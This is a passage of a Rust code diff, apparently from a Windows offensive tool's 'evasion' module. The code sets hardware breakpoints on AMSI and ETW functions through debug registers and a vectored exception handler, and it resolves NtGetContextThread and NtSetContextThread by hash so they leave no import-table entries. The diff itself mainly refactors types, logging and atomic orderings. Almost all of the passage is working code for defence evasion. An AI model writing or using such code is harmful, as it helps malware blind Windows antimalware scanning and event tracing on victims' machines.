             "evasion: apply_hwbp_to_current_thread: SetThreadContext fallback path in use for debug register modification"
         );
     }
 
     // GetCurrentThread() pseudo-handle = (-2)
-    let h: winapi::um::winnt::HANDLE = (-2isize) as *mut _;
+    let h: crate::win_types::HANDLE = (-2isize) as *mut _;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
@@ -922,7 +958,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let got_ctx = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut ctx);
         if status < 0 {
-            log::warn!(
+            tracing::warn!(
                 "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
@@ -937,7 +973,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     };
 
     if !got_ctx {
-        log::warn!(
+        tracing::warn!(
             "evasion: apply_hwbp_to_current_thread: GetThreadContext failed — skipping HWBP setup"
         );
         return;
@@ -948,7 +984,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     let set_ok = if let Some(nt_set) = nt_set_ctx {
         let status = nt_set(h, &mut ctx);
         if status < 0 {
-            log::warn!(
+            tracing::warn!(
                 "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to syscall",
                 status as u32
             );
@@ -963,7 +999,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     };
 
     if !set_ok {
-        log::warn!(
+        tracing::warn!(
             "evasion: apply_hwbp_to_current_thread: SetThreadContext failed — debug registers not modified"
         );
         return;
@@ -996,7 +1032,7 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
         let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
         let (expected0, expected1) = hwbp_slot_values(&ctx);
-        log::warn!(
+        tracing::warn!(
             "evasion: apply_hwbp_to_current_thread: SetThreadContext verification failed — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
             actual0, expected0,
             actual1, expected1,
@@ -1045,7 +1081,7 @@ pub unsafe fn disable_evasion() {
             ) {
                 let remove_veh: RemoveVehFn = std::mem::transmute(addr);
                 remove_veh(handle as *mut _);
-                log::info!("evasion: VEH handler removed (handle={:#x})", handle);
+                tracing::info!("evasion: VEH handler removed (handle={:#x})", handle);
             }
         }
         VEH_HANDLE.store(0, Ordering::Release);
@@ -1053,9 +1089,9 @@ pub unsafe fn disable_evasion() {
 
     // Clear hardware breakpoint addresses so stale Dr0/Dr1 values no longer
     // trigger the (now-removed) VEH handler.
-    AMSI_ADDR.store(0, Ordering::Relaxed);
-    ETW_ADDR.store(0, Ordering::Relaxed);
-    RET_GADGET.store(0, Ordering::Relaxed);
+    AMSI_ADDR.store(0, Ordering::Release);
+    ETW_ADDR.store(0, Ordering::Release);
+    RET_GADGET.store(0, Ordering::Release);
 }
 
 /// No-op on non-Windows.
@@ -1083,10 +1119,10 @@ struct SavedDebugRegs {
 /// `NtSetContextThread` resolved dynamically from ntdll (no IAT entries).
 #[cfg(windows)]
 unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
-    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
-
-    let amsi = AMSI_ADDR.load(Ordering::Relaxed);
-    let etw = ETW_ADDR.load(Ordering::Relaxed);
+    use crate::win_types::CONTEXT;
+    use crate::win_types::CONTEXT_DEBUG_REGISTERS;
+    let amsi = AMSI_ADDR.load(Ordering::Acquire);
+    let etw = ETW_ADDR.load(Ordering::Acquire);
     if amsi == 0 && etw == 0 {
         // HWBPs not active — nothing to save/clear.
         return SavedDebugRegs { dr0: 0, dr1: 0 };
@@ -1098,8 +1134,8 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
         return SavedDebugRegs { dr0: 0, dr1: 0 };
     }
 
-    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
-    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtGetCtxFn = unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
+    type NtSetCtxFn = unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
 
     let nt_get: Option<NtGetCtxFn> =
         pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
@@ -1109,7 +1145,7 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
         pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
             .map(|a| std::mem::transmute(a));
 
-    let h = (-1isize) as winapi::um::winnt::HANDLE; // NtCurrentThread()
+    let h = (-1isize) as crate::win_types::HANDLE; // NtCurrentThread()
 
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
@@ -1149,8 +1185,8 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
 /// Restore previously saved Dr0/Dr1 values on the current thread.
 #[cfg(windows)]
 unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
-    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};
-
+    use crate::win_types::CONTEXT;
+    use crate::win_types::CONTEXT_DEBUG_REGISTERS;
     if saved.dr0 == 0 && saved.dr1 == 0 {
         return; // Nothing to restore.
     }
@@ -1160,19 +1196,19 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
         return;
     }
 
-    type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtSetCtxFn = unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
 
     let nt_set: Option<NtSetCtxFn> =
         pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
             .map(|a| std::mem::transmute(a));
 
-    let h = (-1isize) as winapi::um::winnt::HANDLE;
+    let h = (-1isize) as crate::win_types::HANDLE;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
 
     // Get current context to preserve Dr7 settings.
-    type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtGetCtxFn = unsafe extern "system" fn(crate::win_types::HANDLE, *mut CONTEXT) -> i32;
     let nt_get: Option<NtGetCtxFn> =
         pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
             .map(|a| std::mem::transmute(a));
